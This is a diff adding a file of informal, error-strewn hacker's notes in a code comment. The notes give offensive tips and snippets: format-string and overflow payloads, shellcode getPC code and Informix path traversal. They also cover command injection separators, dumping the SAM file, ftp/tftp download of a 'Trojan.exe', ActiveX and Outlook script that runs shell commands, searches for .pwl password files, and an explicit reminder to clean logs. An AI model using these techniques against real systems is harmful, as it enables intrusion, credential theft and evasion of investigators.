@@ -1,0 +1,397 @@
+// 	Hi guys I used that file to store here who knows smething like.. 
+//	interesting info.   !!! Vulnerabilities of programm software. !!
+
+/*
+
+[	Tips	]
+
+	Common: 
+	- 	Check the send list bugtrac to know new bugs in programs.
+	- 	Check program which have posibibliti and have access to system area.
+	- 	Used configuration file of hacker for privileged programms 
+		to get more privileges.
+	- 	Use\Check Global system variables if the dest. program used them. 
+		('like Enivremnt variable PATH, LD_LABRARY_PATH')
+	-	Direct access to executable files from web-servers. e.g. perl.exe,
+		perl.dll, bin/sh and others. To search such files use Google, AltaVista
+	-	functional posibility in different parts of OS.
+	-	Very useful tool todo investiagtion by whitebox method is IDA-Pro and 
+	-	Hardware Virus is vey usefull it often placed into EPPROM memory of the Pc. 
+	some programs on cigital.com
+	-	Default settings in different programs could give a lot of possibilities
+	to hack. (e.g. PHP - global variables).
+	-	in some php programs data can be transfered to system areas as formated 
+	string so can be used buffer overrun attack. 
+	-	Free shares of session and user indentifiers may allow to change priviliges 
+	by replacing session variable.
+	-	Use different command coding.. to run the same command.
+	-	Use another type symbol coding. like \/ or other you path behind program filters.
+	Somtimes you may use it in UTF and Unicode converting.
+	-	utf - 8 -> RFC-2044 to use hex encoded characters.
+	-	You may use also alternative using of IP address coding.
+	-	same IP addresses:
+		http://msdn.microsoft.com
+		http://207.46.239.122
+		http://3475959674
+	-	Union different attack types to get effrctive attack
+	-	Sometimes injection Vector can include usefull preasure (code prepared by hacker)
+	or you may point from injection vector to memory segment where that code stay.
+	-	Sometimes addresse could be plaesed in diiferent order from right to left
+	it deppends on system.
+	-	instead of inserting code just code that you need in memory and run it.
+	
+		
+	
+	Win:		
+	- 	boron in Thread Class on windows is information tag about user.
+ 	- 	http://technet.microsoft.com/en-us/sysinternals/default.aspx
+		sysinternals for windows. filemon and regmon.
+	- 	http://www.sysinternals.com
+	-	nc like netcat but on Windows. 
+	-	netstat -ano like netstat in Ulike.
+	-	In windows when debugging programm search next functions.
+		WSAend()	fwrite()	fread()		WSARecv()
+	-	If you send to Microsoft WEb server string like ::$data it would read
+	only 3 last letters. You may use it to run malicious programm on server.
+	
+	
+	Ulike:
+	- 	netcat program to create unvisisble client on Ulike platforms.
+	-	ltrace same as Truss but on Ulike systems.
+	-	check system to local socekt request netstat -an. also lsof
+	-	whin using PATH variable system could use ls commmabd which can be replaced
+	by hacker.
+	
+	Solaris:
+	-	Truss is a programm to handle internall requests to libraries in SOLARIS
+
+	Informix:
+	-	http://<atacked host>/ifx/?LO=../../../etc/
+	
+	by Olko: 
+	- 	Create script which will create md5 sums of system files and 
+		store that files in specified directory. 	
+	-	Create script which coppies log files into other directory.
+	-	Creating white lists is more usefull than creating black lists.
+	-	If investigation system realy complex you should partiotion it into
+	small pieces.
+	-	Use prorgramm segmments in which data from user is processing and this 
+	segment is not secured. 
+	-	To define which exe format  used you may use Dr.Web for that.
+
+
+[	IDS - Interrupt detection systems	]
+
+1.	There is two systems for interrupt detection:
+	-	based on signature detection.
+	-	Based on abnormal approach of programs.
+	
+
+
+[	Buffer overflow attack	]
+
+	-	Hacker could change data in file (for Example in mp3 file) and then 
+	programm read that data and put it into memmory.
+	-	For Netscape Communicator there is a bug connected with font highness.
+	-	exim has also a bug connected with buffer overflow when you put into 
+	:include: parameter (in file .forward) too big value 
+	-	Sometimes symbolic link gives you a full access to file.
+	-	Another type of attack could be performed during mime coding/decoding.
+	-	Use searching of the fixed length values of the programm(string, float numbers.)
+	dont forget also about converting decimal into floating numbers errors. 
+	-	We should find mimnimal excess of the allowed buffer size.
+	-	next functions doesn't write NULL character at the end:
+		fread()
+		read()
+		readv()
+		pread()
+		memcpy()
+		memccpy()
+		bcopy()
+		gethostname()
+		strncat()
+	-	To Attack on other programs you may use functions with Null symbol writing.
+	in that case that sy,bol could rewrite data in stack segment. Then function
+	pop's wrong data pointer and give to IP register hacker command address. 
+	-	You may also use stahck buffer overflow to rewrite address of the Exception
+	code pointer which alocated at the end of stack segment. Then hacker may compromice 
+	Exception situation in code to run his code. 
+	-	Use Arifmetic errors of the memory calculations. 
+	-	Experienced hackers used numebrs near the most boggest values of the 
+	binary numbers (e.g 0xffffffff 0x00000000 signed 0x7ffffffff 0x800000000).
+	you may use different arithmetic operations to get very big number value.
+	to get problem like this you should look for:
+	 	sub ecx, eax
+	 	sub ecx, 1 
+	-	Regular expression to find code with comparision j[gl]
+	-	Regulat expression to find srithmetic operations.
+	-	When you used %n format specificator after some data it set varibale which
+	address pasted after format string. e.g. 
+			int my_var
+			printf("AAAAA%n ", &my_var) in my_var would be 5	
+	-	Format string %08x let us to output double word from stack.  	
+	-	If you Use "%s" format string you may read any address of the Stack. e.g.
+			"AAAAA\x70\xF5\xF7\x77%08x....._%s_" will output
+			AAAAA......._dfkmdfklgmdlkmdoer03i 90f9034tj_ it would be our string.
+	Also you may use another variant. Instead of %s use %n and it input number of
+	input in specified address. (see above).
+	-	Use %u with %n to change number of output symbols. and in that way put data 
+	huch requrieed by us or hacker. But beetwen data which means address inseert data
+	like \x42\x42\x42\x42 (any data).
+	-	There is a lot of attacks by using Heap. (use ntdll to get these functions)
+	-	'malloc' and 'free' is the same functions. 
+	-	To Hack C++ prgrmas use Vtable and replace Vtable values to addresses
+	which points to hacker functions.
+	-	to get current EIP  register use next asm code
+		start : 
+			jmp RELOC3
+		RELOC2:
+			pop	edi
+			jmp AFTER_RELOC
+		RELOC3:
+			call RELOC2
+		AFTER_RELOC:
+	In this case we get code withotu Null symbols.
+	-	NULL symbols shouldn't be used in Hacker prepared data.
+	-	Sometimes we could hardcode function adresses calls to archive our code.
+	-	use controll summs to fidn functions which you need.
+	-	some times you may use multiplatform code. To use that Create jmp construction
+	for one platform (that interprets code on other platform without doing damage). 
+ 	here would be vulnerable code for current platform. And for another platform 
+ 	just put vulnerable code after lmp code for current platform.
+ 	-	
+	
+[	Rootkits by yourself	]
+	
+	-	HKLM\SOFTWARE\Microsoft\Windiws NT\CurrentVersion\NetworkCards - use to
+	get network cards on windows.
+	-	PIC(programmable interrupt controller) used to repprogramm hardware interrupts
+	into programm interrupts. That's why whrn we want to asl IRQ 1 it wont be 
+	keyboard inerrupt. ))))instead of it windows used (IRQ 0-15) -> (0x30-0x3f)
+	
+
+
+[	Tracing vulnerability place of programm		]
+
+	-	It is nice practice to trac dll  libraries to get broken functions. 
+	BEcause by using this functions you can execute youe code from many applications.
+	[	steps	Back tracing	]
+		1.	Get vulnerable place of programm - write small program which can test 
+		function in library. Also write /get programm which produce different 
+		argumnets to functiona and save	results of functioning. Grab arguments which
+		involves program in bad habbit (read file, etc.)
+		2.	Then test is the bad data (which grabbed in 1.) goes into unsecured place
+		of programm.
+			-	There is 3 or more stages of bad data path. 
+				1.	Input data - where data inputs into programm
+				2.	Filter data - where data could br filtered.
+				3.	Vulnarbilit part - Where data do it harm/dark work.
+		3.	Check the data incoming part of the programm. 
+	
+	[	steps for direct tracing	]
+		1.	check all start points.
+		2.	check if code goes to the big segment
+	
+	[	tracing during programm running	]
+		1.	Use code coverage tools. 
+		2.	Use speed braks to go to the code where user data is used.
+		3.	Use debuggers which allows you to stop programms at data reading
+		from memory/buffer procedure (it calls leapfrogging). OllDbg best choice.
+		4.	Also nice idea to improve analyzing is to use "find by patern" method		
+		(aka boron tagging). desc: when you use leapfrogging by using current method
+		programm looks in all memory segment stored in PC registers for a search string.
+		If it find it, that segment would be user data segment.
+		5.	It usefull to find test reg,reg operations because it could be analyzing 
+		of Null ending of the string.
+
+[	Analyzing     ]
+
+1.	...
+	-	Use grafical representaion of analyzed data to se bahavior and limits of
+	random values (e.g use grafs and OpenGL representation.). and other static
+	analyzing.
+
+
+[   Server hacks    ]
+
+1.	Including commands for oprating system inyterpretter. e.g. cmd, /bin/sh others. 
+	-	use next API realisatins system() exec() open()
+	-	use commands like cat and ping to determine different Oses. 
+	-	use ftp to allow load from any ftp address. 
+	-	To hide cmsd screen use following programm http://homepage.ntlworld.com/chawmp/elitewrap/
+	also to hide any command runing use next script example: 
+	start "window name" /MIN cmd.exe /c <commands>
+	-	injection into web forms malicious code. e.g cat C:\winnt\repair\sam
+	-	symbols to split commands in different Oses:
+	%0a  	>   	'		;		|		>/dev/null 2>&1 |
+	
+	-	!!!!!!!!!!!!!!! 	DO NOT FORGET TO CLEAN LOGS		!!!!!!!!!!!!!!
+	
+	-	Return carriage symbol could be very usefull when pasting command to
+	interpretter.
+	-	Double preEscape function (use escape symbols to hide from analyzing 
+	systems preEscape as mauch as you need)
+	-	use > to redirect output and add it into file previous data will be deleted.
+	also use >> to add string to file from any program e.g echo "some text"
+	-	use debug under Windows to create executable files of com format. You 
+	should use .src files : 
+	debug.exe < somescript.src
+	-	to check can you write or not write on file system use touch command.
+	-	Under windows log files ussualy stored in WINNT\system32\Logfiels.
+	-	if user can write file e.g. echo >> ... then it could delete it. 
+	-	ftp.exe -s:ftp.txt <IP Address>, ftp.txt script for ftp client. Also 
+	user may use tftp program to download malicious code. e.g "Trojan.exe"
+	-	use diffrent commands to add privileged users to Oper. system. in win:
+	net.exe ....
+	-	use at commands at both systems to run commands in defined time. 
+
+2.	Hacking by using local sockets files. and other things like pipes. 
+	-	Sometimes Parent processes add privileges to child processes so 
+	it canbe usful to get a permission of parent process.
+	-	In ACL ccounts could be the same functionality. 
+	-	Sometimes hacker can path into function not usual parameters. which can 
+	damage another files for e.g. You use username as path to log file. If User 
+	add ../../../ He can access to high level directory in File System. To Delete
+	added string on server you should use NULL symbol in different kind via 
+	escape Symbols and others.	 
+
+3.	Hacking by using client programs vulnerabilities (terminals, browsers and other).
+	-	Hack by using terminal escape codes of the termianl.
+	-	There is a special symbols in telephone systems. which allows you to 
+	go thru international gateways. like signal with frequesncy of 2600 Hz. 
+	-	Sometimes you can send or receive file by using terminal commands. For Example:
+	pattern for sending:	ESC{T<filename>CR	
+	pattern for receiving:	ESC{R<filename>CR		
+	-	Programm netterm could also execute som commands from sended messages.
+	-	Printers by HP company used interesting method to control. They used their own 
+	language called PCL. to Use them there is site about that with location:
+	-	Adding symbols into keyboard buffer 
+	e.g on Linux: 
+	perl -e 'print "\x9E\x9bc"'
+	echo -e "\033\132"
+	to send commands to another linux shell use next commands:
+	echo -e '\033\132' >> dev/ttyXX
+	to hide symbols output them in black color use '[30m ' command code
+	e.g. : echo -e "\033 [30m \033 \132"
+	-	Using XSS technology to include malicious code into site. By using as input
+	data in forms text like: "<script>...</script>" we can send interested info to our
+	server.U can addd this into very sifferent part of web page and not only. 
+	-	You may use &lt $gt $amp instead of standard tags.
+	-	Also id server checks HTTP headers for example, you may use it fotr investigation.
+	-	Check parameters og URL request.
+	-	You MAy use the Client script to get access to client information. Often they 
+	get's Shell uinterpretter object to run different commands. 
+	Wscript.Shell	Host() function.   e.g:
+	
+	Myobj = new ActiveXObject("WScript.Shell");
+	Myobj.Run("C:\\WINNT\\SYSTEM32\\CMD.EXE /C DIR C:\\ //A /P /S")
+	
+	Scripting.FileSystemObject - used to create different files on local file system.
+	WScript.Network - used to mount network drives.
+	Scriptlet.Typelib - used to hiddenly create files on local machine.s
+	-	Use preloader posibility of IE to read crirtical files. 
+	-	Use GetObject() function to get files also e.g
+	DD = GetObject("c:\\boot.ini","htmlfile");  to get access to that file use:
+	DD.body.innerText. 	Such  problems also has next Object ixsso.query e.g
+	
+	nn = ActiveXObject("ixsso.query");
+	nn.Catalog="System";
+	nn.query='@filename = *.pwl';
+	-	Meta symbols in Messaga headers (message: sms, E-mail, other)
+	-	Lot Ee-mali programs used html code in their email messages you
+	may use script to include code into messages. especialy in FROM and TO headers.
+	-	Outlook runs html page when you turn on reply or forward message.
+	-	There is usefull object in outlook Application:
+	NN = MySession.Session.Application.CreateObject("WScript.Shell");
+	NN.Run(...);   				Also you may use VB for Applicaions:
+	Set myApp = CreateObject("Outlook.Application");
+	myApp.CreateObject("WScript.Shell");
+	-	Object called view control used to hack Outlook also see below into code:
+	<object id="view_control" classid="clsid:0006F063-0000-0000-C000-000000000046">
+		<param name="folder" value="inbox">
+	</object>
+	
+	<script>
+	function myFunc() {
+		mySelection = o1.object.selection;
+		myItem = mySelectio.Item(1);
+		mySession = myItem.Session.Application.CreateObject("WScript.Shell");
+		mySession.Run("...");
+	}
+	
+	setTimeout("myfunc()", 1000);
+	</script>
+	
+	-	There is a lot types of attacks where atack program was hidden in attached documents. 
+	-	downloader behavior in IE is realy different.
+
+[	Investigations  ]
+
+1. 	Investigate input data flow in programm.
+2. 	Use list of bug fixes to know vulnerabilities of previous versions of code.
+3. 	Windows has it's own debugger which can be used. Use type DEBUG_EVENT
+4. 	There is a lot of system processes to debug anty programm and process in Win.
+5. 	There are also two methods of investigation:
+	-	from inside to outside where hacker looking into code to find
+	function which wrote into outer file. 
+	-	from putside to inside where hacker look into code to find
+	outer data passed to programm and when and where prohram begin to
+	work with that data.
+	
+6.	For black box investigation we should use ISICS, protos, Spike
+
+Grey method - Purify.
+Valgrind free under linux
+
+
+[	Old ethernet bug	]
+
+Bad ethernet functionality:
+ in old ethernet cards there was vulnarability with packet. 
+ in all packet (size of ethernet paket = 66 bytes there was data less than 66 bytes.)
+ so Ethernet adapters sent also data from previous packet to fill packet size. 	
+ http://archives.neohapsis.com/archives/vulnwatch/2004-q1/0016.html
+
+[  About IDA   ]
+IdA supports writing scripts. it called IDC scripts. 
+
+
+[    programs:	and tools ]
+APISPY32 - www.internals.com
+IDA - www.datarescue.com
+REC free but secret source code
+WDASM - commercial disassmebler.
+dumpbin - tool for inspecting included libararies in windows files.
+The PIT - www.hbgary.com
+Truss - programm on Solaris to trac lib calls. 
+Alchemy Eye - program for network monitoring. 
+Hailstorm - generator of bad data.
+Purify - programm for testing in Grey method. 
+Valgrind - the same programm but under Linux.
+Depency Walker - used to create depency tree of DLL files. STD PROGRAMM OF MS STUDIO
+Fernis - programm under linux to trace during programm runing.
+SpeedBreak - programm for intermidiate break. look into www.sourceforge.net
+SoftIce - universal debugger.
+OllyDbg - also universall debugger.
+SourceScope - programm for investigating programms for vulneranility.
+dbgvnt - programm used to see debug messages for windows drivers.
+www.immunitysec.com - programm for checking for rootkits on Solaris.
+
+[	books	]
+
+1. Hacker secrets. 
+2. Writing secure Code.
+3. Building Secure Software.
+4. Developing Windows NT Device drivers: Programer's Handbook (1999)
+
+
+[	aksioms	]
+
+1. NO any user a good user (user that sent correct data i.e. web user) - used in server applications.
+2. Anything that created by human can be hacked by human.))))
+
+[	Journals	]
+Phrack journal rel.: 59, 60 - should read.. 
+
+ */
+									//cReated bY fRiends c0 nAr(c)
